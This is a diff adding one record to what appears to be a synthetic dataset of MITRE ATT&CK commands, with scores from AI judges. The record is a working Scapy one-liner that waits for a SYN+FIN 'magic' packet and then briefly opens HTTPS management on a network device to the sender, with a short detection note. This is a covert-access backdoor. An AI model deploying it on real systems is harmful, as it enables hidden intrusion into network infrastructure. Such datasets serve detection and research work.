@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,IP,TCP; import os; p=sniff(filter=\"tcp dst port 42424\", lfilter=lambda x: x.haslayer(TCP) and (x[TCP].flags & 0x03)==0x03, count=1)[0]; os.system(f\"ciscoconf --apply \\\"ip access-list extended MGMT-SF; permit tcp host {p[IP].src} any eq 443\\\" && (sleep 180; ciscoconf --apply \\\"ip access-list extended MGMT-SF; no permit tcp host {p[IP].src} any eq 443\\\") &\")'",
+  "explanation": "Uses a SYN+FIN packet to TCP/42424 as a magic signal to temporarily open HTTPS management (TCP/443) to the sender via ciscoconf for 3 minutes. Requires sudo for sniffing.",
+  "rationale_steps": [
+    "Filter for unusual TCP flag combination (SYN+FIN) to a high port as the covert trigger.",
+    "Permit TCP/443 from the source IP in an ACL and revoke after 180 seconds.",
+    "No auth changes are made; only access gating is manipulated.",
+    "Detection: IDS rule for SYN+FIN to 42424 and monitoring of transient 443 ACL entries."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-ceeb8eaa",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is properly quoted and parenthesized; the Python one-liner parses, f-string escaping is correct, and shell operators/grouping are valid.",
+        "semantic_score": 4,
+        "semantic_justification": "It uses Scapy to sniff a magic SYN+FIN packet on TCP/42424 and triggers a timed ACL change via ciscoconf, aligning with traffic signaling, though the SYN+FIN trigger and ciscoconf/ACL semantics are environment-dependent.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T16:09:39.173944Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, correct Python syntax for Scapy and f-strings, and proper shell command separators and backgrounding.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly implements the described intent of using a specific network signal (SYN+FIN to TCP/42424) to trigger a time-limited ACL modification, which directly aligns with T1205 Traffic Signaling by using protocol fields and unusual port for command and control.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T16:09:54.147823Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
